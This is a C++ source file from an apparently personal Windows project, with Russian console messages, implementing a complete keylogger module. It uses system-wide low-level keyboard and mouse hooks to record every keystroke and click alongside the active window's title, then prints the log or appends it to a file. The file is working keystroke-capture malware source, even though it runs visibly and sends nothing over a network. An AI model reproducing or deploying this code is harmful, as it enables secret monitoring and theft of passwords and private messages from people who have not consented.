//
// Created by ddeeaaddllyy on 03.01.2026.
//

#include "../../../include/EchoEngine/modules/keylogger/keylogger.h"

#include "../../../include/EchoEngine/utils/string_utils.h"
#include <iostream>
#include <ostream>
#include <fstream>
#include <sstream>
#include <chrono>
#include <thread>
#include <ctime>
#include <iomanip>

bool KeyLogger::s_captureEnabled = true;
bool KeyLogger::s_waitingForTrigger = true;
bool KeyLogger::s_outputToConsole = true;
std::string KeyLogger::s_outputFilename;
std::vector<std::string> KeyLogger::s_keyLogBuffer;
size_t KeyLogger::s_totalCaptured = 0;
HHOOK KeyLogger::s_keyboardHook = nullptr;
HHOOK KeyLogger::s_mouseHook = nullptr;
HWND KeyLogger::s_consoleHook = nullptr;
CRITICAL_SECTION KeyLogger::s_criticalSection;
bool KeyLogger::s_programRunning = true;
std::atomic<bool> g_requestOutput{false};
std::atomic<bool> g_requestExit{false};
DWORD KeyLogger::s_messageThreadId = 0;
size_t KeyLogger::s_flushThreshold = 50;

KeyLogger::KeyLogger() :
    m_running(false),
    m_initialized(false) {
    InitializeCriticalSection(&s_criticalSection);
    s_consoleWindow = GetConsoleWindow();
}

KeyLogger::~KeyLogger() {
    shutdown();
    DeleteCriticalSection(&s_criticalSection);
}

bool KeyLogger::initialize() {
    if (m_running) {
        return true;
    }

    SetConsoleCtrlHandler(consoleCtrlHandler, true);

    if (!installHooks()) {
        std::cerr << "installHooks failed" << std::endl;
        return false;
    }

    m_initialized = true;
    return true;
}

void KeyLogger::run() {
    if (!m_initialized) {
        if (!initialize()) return;
    }

    m_running = true;
    s_programRunning = true;

    s_messageThreadId = GetCurrentThreadId();

    processMessageLoop();
}

void KeyLogger::shutdown() {
    if (!m_initialized) {
        return;
    }

    m_running = false;
    s_programRunning = false;
    uninstallHooks();

    if (!s_keyLogBuffer.empty()) {
        std::cout << "\n\n=== ФИНАЛЬНЫЙ ВЫВОД ===" << std::endl;
        printBufferedLog();
    }

    m_initialized = false;
    std::cout << "Программа завершена." << std::endl;
}

bool KeyLogger::installHooks() {
    s_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, nullptr, 0);

    if (!s_keyboardHook) {
        std::cerr << "SetWindowsHookEx keyboard failed: " << GetLastError() << std::endl;

        return false;
    }
    s_mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, nullptr, 0);
    if (!s_mouseHook) {
        std::cerr << "SetWindowsHookEx mouse failed: " << GetLastError() << std::endl;

        UnhookWindowsHookEx(s_keyboardHook);
        return false;
    }

    return true;
}

void KeyLogger::uninstallHooks() {
    if (s_keyboardHook) {
        UnhookWindowsHookEx(s_keyboardHook);
        s_keyboardHook = nullptr;
    }
    if (s_mouseHook) {
        UnhookWindowsHookEx(s_mouseHook);
        s_mouseHook = nullptr;
    }
}

LRESULT CALLBACK KeyLogger::keyboardHookProc(
    const int nCode,
    const WPARAM wParam,
    const LPARAM lParam
    )
{
    if (nCode == HC_ACTION && s_captureEnabled) {
        auto* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            if (p->vkCode == VK_RETURN) {
                g_requestOutput.store(true, std::memory_order_relaxed);
                PostThreadMessage(s_messageThreadId, WM_APP + 1, 0, 0);
            }

            if (p->vkCode == 'R' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
                g_requestExit.store(true, std::memory_order_relaxed);
                PostThreadMessage(s_messageThreadId, WM_QUIT, 0, 0);
            }


            EnterCriticalSection(&s_criticalSection);
            s_keyLogBuffer.emplace_back(
                getActiveWindowTitle() + " | " +
                virtualKeyToString(p->vkCode)
            );
            LeaveCriticalSection(&s_criticalSection);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}


LRESULT CALLBACK KeyLogger::mouseHookProc(
    const int nCode,
    const WPARAM wParam,
    const LPARAM lParam
    )
{
    if (nCode == HC_ACTION && s_captureEnabled) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {

            EnterCriticalSection(&s_criticalSection);
            s_keyLogBuffer.emplace_back(
                getActiveWindowTitle() +
                (wParam == WM_LBUTTONDOWN ? " | [ЛКМ]" : " | [ПКМ]")
            );
            LeaveCriticalSection(&s_criticalSection);

            g_requestOutput.store(true, std::memory_order_relaxed);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}


void KeyLogger::processMessageLoop()
{
    MSG msg;

    std::cout << "Программа запущена\n"
              << "Enter / клик — вывод\n"
              << "Ctrl+R — выход\n> ";

    while (GetMessage(&msg, nullptr, 0, 0)) {

        if (msg.message == WM_APP + 1) {
            if (g_requestOutput.exchange(false)) {
                triggerOutput();
            }
        }

        if (msg.message == WM_QUIT) {
            break;
        }

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    shutdown();
}


void KeyLogger::triggerOutput()
{
    std::cout << "\n\n=== ВЫВОД ЛОГА ===\n";
    printBufferedLog();
    std::cout << "\nОжидание следующего триггера...\n> ";
}

std::string KeyLogger::virtualKeyToString(const DWORD vkCode)
{
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) {
        return "";
    }

    HWND hwnd = GetForegroundWindow();
    const DWORD threadId = GetWindowThreadProcessId(hwnd, nullptr);
    HKL layout = GetKeyboardLayout(threadId);

    wchar_t buffer[5] = {0};

    const UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);

    const int result = ToUnicodeEx(
        vkCode,
        scanCode,
        keyboardState,
        buffer,
        4,
        0,
        layout
    );

    switch (vkCode) {
        case VK_LBUTTON: return "[LMB]";
        case VK_RBUTTON: return "[RMB]";
        case VK_BACK: return "[Backspace]";
        case VK_TAB: return "[Tab]";
        case VK_RETURN: return "[Enter]";
        case VK_SHIFT: return "[Shift]";
        case VK_CONTROL: return "[Ctrl]";
        case VK_MENU: return "[Alt]";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_ESCAPE: return "[Esc]";
        case VK_PRIOR: return "[PageUp]";
        case VK_NEXT: return "[PageDown]";
        case VK_END: return "[End]";
        case VK_HOME: return "[Home]";
        case VK_LEFT: return "[Left]";
        case VK_UP: return "[Up]";
        case VK_RIGHT: return "[Right]";
        case VK_DOWN: return "[Down]";
        case VK_INSERT: return "[Insert]";
        case VK_DELETE: return "[Delete]";
        case VK_LWIN:  return "[lWin]";
        case VK_RWIN:  return "[rWin]";
        default:

            if (result > 0) {
                return StringUtils::utf16_to_utf8(std::wstring(buffer, result));
            }

            return "[Key:" + std::to_string(vkCode) + "]";
    }


}


std::string KeyLogger::getActiveWindowTitle() {
    HWND foreground = GetForegroundWindow();
    if (foreground == nullptr) return "[Нет окна]";

    wchar_t title[256];
    GetWindowTextW(foreground, title, _countof(title));

    if (wcslen(title) == 0) {
        return "[Без названия]";
    }

    return StringUtils::utf16_to_utf8(title);
}

void KeyLogger::saveLogToBuffer(const std::string& entry) {
    EnterCriticalSection(&s_criticalSection);
    s_keyLogBuffer.push_back(entry);
    s_totalCaptured++;
    LeaveCriticalSection(&s_criticalSection);
}

void KeyLogger::printBufferedLog() {
    if (s_keyLogBuffer.empty()) {
        std::cout << "\n[Буфер пуст]\n> ";
        return;
    }

    if (s_outputToConsole) {
        std::cout << "\n\n=== НАКОПЛЕННЫЙ ЛОГ (" << s_keyLogBuffer.size() << " записей) ===" << std::endl;

        EnterCriticalSection(&s_criticalSection);
        for (const auto& entry : s_keyLogBuffer) {
            std::cout << entry << std::endl;
        }
        LeaveCriticalSection(&s_criticalSection);

        std::cout << "=== КОНЕЦ ЛОГА ===" << std::endl;
        std::cout << "> ";
    }
    if (!s_outputFilename.empty()) {
        std::ofstream file(s_outputFilename, std::ios::app);

        if (file.is_open()) {
            const auto now = std::chrono::system_clock::now();
            const auto now_time = std::chrono::system_clock::to_time_t(now);
            file << "\n=== Вывод от " << std::put_time(std::localtime(&now_time), "%Y-%m-%d %H:%M:%S") << " ===" << std::endl;
            EnterCriticalSection(&s_criticalSection);
            for (const auto& entry : s_keyLogBuffer) {
                file << entry << std::endl;
            }
            file << "=== Всего записей: " << s_keyLogBuffer.size() << " ===" << std::endl;
            LeaveCriticalSection(&s_criticalSection);

            file.close();
            std::cout << "[Лог сохранен в файл: " << s_outputFilename << "]" << std::endl;
        }
    }
    EnterCriticalSection(&s_criticalSection);
    s_keyLogBuffer.clear();
    LeaveCriticalSection(&s_criticalSection);
}

BOOL WINAPI KeyLogger::consoleCtrlHandler(const DWORD eventType) {
    switch (eventType) {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
            std::cout << "\nПолучен сигнал завершения..." << std::endl;
            s_programRunning = false;
            return TRUE;
        default:
            return FALSE;
    }
}

void KeyLogger::setOutputToConsole(const bool enable) {
    s_outputToConsole = enable;
}

void KeyLogger::setOutputToFile(const std::string& filename) {
    s_outputFilename = filename;

    if (!filename.empty()) {
        std::ofstream file(filename, std::ios::trunc);

        if (file.is_open()) {
            const auto now = std::chrono::system_clock::now();
            const auto now_time = std::chrono::system_clock::to_time_t(now);
            file << "=== Лог перехвата клавиш ===" << std::endl;
            file << "Начало: " << std::ctime(&now_time) << std::endl;
            file.close();
        }
    }
}

void KeyLogger::setCaptureEnabled(bool enabled) {
    s_captureEnabled = enabled;
}

bool KeyLogger::isRunning() const {
    return m_running;
}

size_t KeyLogger::getCapturedCount() {
    return s_totalCaptured;
}